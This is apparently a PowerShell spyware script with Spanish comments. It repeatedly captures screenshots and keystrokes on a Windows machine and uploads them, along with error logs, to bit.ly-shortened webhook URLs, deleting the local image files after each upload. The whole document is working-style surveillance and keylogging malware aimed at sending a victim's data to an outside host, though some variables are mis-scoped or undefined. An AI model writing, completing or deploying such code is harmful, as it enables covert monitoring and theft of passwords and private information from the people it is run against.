# Función para enviar mensajes de error al webhook secundario
function SendErrorLogToSecondaryWebhook {
    param(
        [string]$errorMessage
    )
    try {
        $secondaryWebhookUrl = "https://bit.ly/web_chupacabras"  # URL del webhook secundario
        Invoke-WebRequest -Uri $secondaryWebhookUrl -Method Post -Body "{""error"":""$errorMessage""}" -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Host "Error al enviar registro de error al webhook secundario: $_"
    }
}

# Función para instalar el proveedor NuGet si no está instalado
function InstallNuGetProvider {
    if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
        try {
            Write-Host "Instalando el proveedor NuGet..."
            Install-PackageProvider -Name NuGet -Force -ErrorAction Stop
            return $true
        } catch {
            SendErrorLogToSecondaryWebhook -errorMessage "Error al instalar el proveedor NuGet: $_"
            return $false
        }
    }
    return $true
}

# Función para instalar el módulo InputSimulator si no está instalado
function InstallInputSimulatorModule {
    if (-not (Get-Module -Name "InputSimulator" -ListAvailable)) {
        try {
            Write-Host "Instalando el módulo InputSimulator..."
            Install-Module -Name "InputSimulator" -Scope CurrentUser -Force -ErrorAction Stop
            return $true
        } catch {
            SendErrorLogToSecondaryWebhook -errorMessage "Error al instalar el módulo InputSimulator: $_"
            return $false
        }
    }
    return $true
}

# Función para crear la carpeta temporal si no existe
function CreateTempFolder {
    $TempFolder = "$env:temp\sysw"
    if (-not (Test-Path -Path $TempFolder)) {
        try {
            Write-Host "Creando carpeta temporal..."
            New-Item -ItemType Directory -Path $TempFolder -ErrorAction Stop | Out-Null
            return $true
        } catch {
            SendErrorLogToSecondaryWebhook -errorMessage "Error al crear la carpeta temporal: $_"
            return $false
        }
    }
    return $true
}

# Función para capturar pulsaciones del teclado y enviarlas al webhook secundario
function CaptureAndSendKeystrokes {
    try {
        $keystrokes = @()
        
        # Captura las pulsaciones del teclado durante 30 segundos
        $endTime = (Get-Date).AddSeconds(30)
        while ((Get-Date) -lt $endTime) {
            $key = [Console]::ReadKey($true)
            $keystrokes += $key.KeyChar
        }
        
        # Convierte las pulsaciones del teclado en una cadena y envíalas al webhook secundario
        $keystrokesString = $keystrokes -join ""
        Invoke-WebRequest -Uri $secondaryHookUrl -Method Post -Body "{""keystrokes"":""$keystrokesString""}" -ContentType "application/json" -ErrorAction Stop
    } catch {
        SendErrorLogToSecondaryWebhook -errorMessage "Error al capturar y enviar pulsaciones del teclado: $_"
    }
}

# Función para tomar una captura de pantalla
function TakeScreenshot {
    try {
        # Crea un objeto Bitmap para la captura de pantalla
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
        
        # Guarda la captura de pantalla en un archivo temporal
        $Filett = "$TempFolder\SC$counter.png"
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
        
        # Incrementa el contador
        $counter++
    } catch {
        SendErrorLogToSecondaryWebhook -errorMessage "Error al tomar la captura de pantalla: $_"
    }
}

# Define la URL del webhook principal
$hookurl = "https://bit.ly/web_chupakbras"

# Define el intervalo de tiempo en segundos entre capturas de pantalla
$seconds = 60 # Intervalo de captura de pantalla (1 minuto)

# Define el rango de tiempo en segundos para enviar las imágenes
$sendInterval = 300 # 5 minutos

# Variable para contar las capturas
$counter = 0

# Obtiene la resolución de la pantalla
try {
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
} catch {
    SendErrorLogToSecondaryWebhook -errorMessage "Error al obtener la resolución de la pantalla: $_"
    exit
}

# Ejecuta las funciones de configuración
if (!(InstallNuGetProvider) -or !(InstallInputSimulatorModule) -or !(CreateTempFolder)) {
    SendErrorLogToSecondaryWebhook -errorMessage "No se pudo completar la configuración inicial."
    exit
}

# Realiza la captura de pantalla y envía las capturas
while ($true) {
    # Realiza la captura de pantalla
    TakeScreenshot

    # Si se alcanza el tiempo para enviar las imágenes, envía todas las capturas
    if ($counter -gt 0 -and $counter % ($sendInterval / $seconds) -eq 0) {
        try {
            Write-Host "Enviando imágenes..."
            Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
                Invoke-WebRequest -Uri $hookurl -Method Post -InFile $_.FullName -ErrorAction Stop
                Remove-Item -Path $_.FullName -Force
            }
            $counter = 0
        } catch {
            SendErrorLogToSecondaryWebhook -errorMessage "Error al enviar las imágenes al webhook: $_"
        }
    }

    # Captura pulsaciones del teclado cada 30 segundos y envíalas al webhook secundario
    CaptureAndSendKeystrokes

    # Espera el tiempo definido antes de tomar la próxima captura
    Start-Sleep -Seconds $seconds
}
